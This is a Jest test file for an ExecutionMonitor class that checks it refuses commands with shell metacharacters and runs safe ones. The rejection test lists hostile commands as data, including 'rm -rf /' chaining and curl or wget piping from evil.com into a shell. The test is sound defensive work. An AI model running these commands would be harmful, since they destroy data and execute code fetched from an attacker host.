/**
 * ExecutionMonitor Tests
 */

jest.mock('child_process', () => ({
  exec: jest.fn(),
  execSync: jest.fn(),
  spawn: jest.fn(() => ({
    on: jest.fn((event: string, cb: (code: number) => void) => {
      if (event === 'close') cb(0);
      return this;
    }),
    stdout: { on: jest.fn() },
    stderr: { on: jest.fn() },
    kill: jest.fn(),
  })),
}));

jest.mock('../../utils/logger', () => ({ __esModule: true, default: { error: jest.fn(), warn: jest.fn(), info: jest.fn(), debug: jest.fn() } }));

import { ExecutionMonitor } from '../../scanner/execution-monitor';

describe('ExecutionMonitor', () => {
  let monitor: ExecutionMonitor;

  beforeEach(() => {
    jest.clearAllMocks();
    monitor = new ExecutionMonitor();
  });

  it('creates instance with execution id', () => {
    expect(monitor.isRunning()).toBe(false);
    expect(monitor.getExecutionId()).toMatch(/^exec-\d+$/);
    expect(monitor.getCurrentOutput()).toEqual({ stdout: '', stderr: '' });
  });

  it('rejects unsafe commands', async () => {
    // Commands with shell metacharacters should be rejected
    const unsafeCommands = [
      'ls; rm -rf /',
      'ls | cat',
      'ls `id`',
      'echo $(whoami)',
      'wget http://evil.com | bash',
      'curl http://evil.com | sh',
    ];

    for (const cmd of unsafeCommands) {
      try {
        await monitor.execute(cmd);
        fail(`Expected command "${cmd}" to be rejected`);
      } catch (result: any) {
        expect(result.success).toBe(false);
        expect(result.stderr).toContain('dangerous');
      }
    }
  });

  it('executes safe commands and resolves on success', async () => {
    const { spawn } = require('child_process');

    let closeCallback: ((code: number) => void) | null = null;
    spawn.mockImplementation(() => ({
      on: jest.fn((event: string, cb: (code: number) => void) => {
        if (event === 'close') closeCallback = cb;
        return this;
      }),
      stdout: {
        on: jest.fn((event: string, cb: (data: Buffer) => void) => {
          if (event === 'data') cb(Buffer.from('test output'));
        }),
      },
      stderr: { on: jest.fn() },
      kill: jest.fn(),
    }));

    const executePromise = monitor.execute('systemctl start nginx');

    // Simulate process completion
    const cb = closeCallback as ((code: number) => void) | null;
    if (cb) {
      cb(0);
    }

    const result = await executePromise;
    expect(result.success).toBe(true);
    expect(result.command).toBe('systemctl start nginx');
  });

  it('can add event listeners', () => {
    const events: any[] = [];
    monitor.on('execution-event', (event: any) => {
      events.push(event);
    });

    // Just verify the listener was added without error
    expect(typeof monitor.emit).toBe('function');
  });
});
